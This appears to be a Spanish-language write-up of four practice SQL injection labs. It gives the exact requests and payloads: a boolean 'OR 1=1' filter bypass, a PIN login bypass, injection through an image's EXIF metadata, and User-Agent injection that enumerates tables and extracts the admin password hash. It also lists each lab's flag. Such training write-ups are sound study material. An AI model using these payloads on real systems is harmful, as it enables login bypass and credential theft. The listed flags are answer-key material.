# Resolución de laboratorios prácticos — SQL Injection

## NSA

1. Revisé la vista **Projects**. El filtro normal por tipo `APT` no devolvía resultados, aunque el desplegable ofrecía esa opción.
2. En Burp Proxy → HTTP history localicé la solicitud del filtro: `GET /backend/index.php?type=3`. La respuesta era `200 OK` con `{"status":"ok","data":{"projects":[]}}`.
3. Probé una comilla simple en `type` (`type=3'`). La aplicación devolvió un error de sintaxis MySQL que incluía la condición `p.id_nivel != (SELECT id FROM niveles WHERE nombre='Top Secret')`. Esto confirmó que el valor se incorporaba a una consulta SQL y reveló la condición que excluía los proyectos Top Secret.
4. Las primeras variantes con comillas y comentarios dieron errores de sintaxis. Al revisar la petición, confirmé que `type` se procesa como un valor numérico y que debía mantener la prueba en la cadena de consulta de la petición GET, sin cuerpo.
5. En Burp Repeater envié la solicitud `GET /backend/index.php?type=3 OR 1=1`. La condición `OR 1=1` alteró la lógica de la consulta; por la precedencia de `AND` sobre `OR`, la condición de nivel no impidió que se devolvieran proyectos APT Top Secret.
6. La respuesta incluyó dos proyectos APT con nivel `Top Secret`. En el nombre de `NS4_B2W` apareció el valor `141e9ea9d1c4ade203ffe3ee03ebff1c`.
7. El juez aceptó `141e9ea9d1c4ade203ffe3ee03ebff1c` como flag y el laboratorio quedó resuelto.

## Home Banking

1. Abrí el formulario de PIN y envié un valor arbitrario (`2323`) para obtener una respuesta base. La solicitud fue `POST /index.php`, con el cuerpo `txtPin=2323&btnIngresar=Ingresar`.
2. En Burp Repeater probé una comilla en `txtPin` (`2323'`). El servidor respondió `500 Internal Server Error` y volvió a presentar el formulario, sin mostrar el detalle del error SQL.
3. Probé `0 OR 1=1` sin cerrar la cadena. El servidor respondió normalmente, pero mantuvo el mensaje de PIN inválido.
4. En Burp Repeater envié el cuerpo `txtPin=2323' OR '1'='1' -- -&btnIngresar=Ingresar`. La respuesta mostró **Ingreso exitoso** y confirmó que el PIN podía eludirse mediante SQL Injection.
5. El juez confirmó el desafío y mostró la flag `bf58371373e52613ae270d5acf832bad`.

## Galería de imágenes

1. Revisé la galería, que mostraba una foto con `Make: NIKON CORPORATION`. Descargué la imagen y consulté sus metadatos con `exiftool aac9aedad20743168cc9d8f5c61ced02`.
2. Comprobé el flujo modificando el fabricante con `exiftool -Make='hola' aac9aedad20743168cc9d8f5c61ced02` y verifiqué el cambio con `exiftool -Make aac9aedad20743168cc9d8f5c61ced02`. Al subir la imagen, la tarjeta mostró `Fabricante: hola`.
3. Renombré el archivo como `prueba.jpg` y cambié `Make` a una comilla simple con `exiftool -Make="'" prueba.jpg`. Al subirlo, la aplicación mostró un error de SQLite que comienza con `unrecognized token`, señal de que el valor se incorporaba sin escapar a la consulta.
4. Reemplacé `Make` con `exiftool -Make="'||(SELECT file FROM pragma_database_list WHERE name='main')||'" prueba.jpg` y verifiqué el metadato con `exiftool -Make prueba.jpg`.
5. Subí `prueba.jpg`. La galería mostró como fabricante la ruta `/app/DESAFIO-SUPERADO-3f8ca106a5118b3c418ec00907120d6a.db`. Tras reiniciar la instancia del laboratorio, repetí la carga y obtuve la misma ruta.

## Logs

1. Abrí `/logs` y observé que la página muestra registros de visitas con identificador, fecha y hora, y el valor del encabezado `User-Agent`.
2. En Burp Repeater envié `GET /` con `User-Agent: hola`. La respuesta fue `200 OK` y el valor `hola` apareció en una fila nueva de `/logs`.
3. Probé `User-Agent: hola'`. La aplicación respondió `500 Internal Server Error`, señal de que el valor se incorporaba sin escapar correctamente a una consulta SQL.
4. Envié `User-Agent: hola' || 'mundo`. SQLite evaluó la concatenación y `/logs` mostró `holamundo`.
5. Enumeré las tablas con `User-Agent: hola' || (SELECT group_concat(name) FROM sqlite_master WHERE type='table') || '`. El registro mostró `holalogs,sqlite_sequence,users`.
6. Consulté la definición de `users` con `User-Agent: hola' || (SELECT sql FROM sqlite_master WHERE type='table' AND name='users') || '`. El resultado mostró los campos `id`, `username` y `password`.
7. Consulté los nombres con `User-Agent: hola' || (SELECT group_concat(username) FROM users) || '`. `/logs` mostró `holaadmin`, confirmando que existe el usuario `admin`.
8. Consulté el campo `password` de `admin` con el valor enviado `hola' || (SELECT password FROM users WHERE username='admin') || 'hola' || (SELECT password FROM users WHERE username='admin') || '`. La expresión quedó duplicada en el encabezado, por eso `/logs` mostró dos veces el hash `7c16e2dead8630673e7b1cb8570fe32a`. El usuario confirmó que ese hash era la flag del desafío.
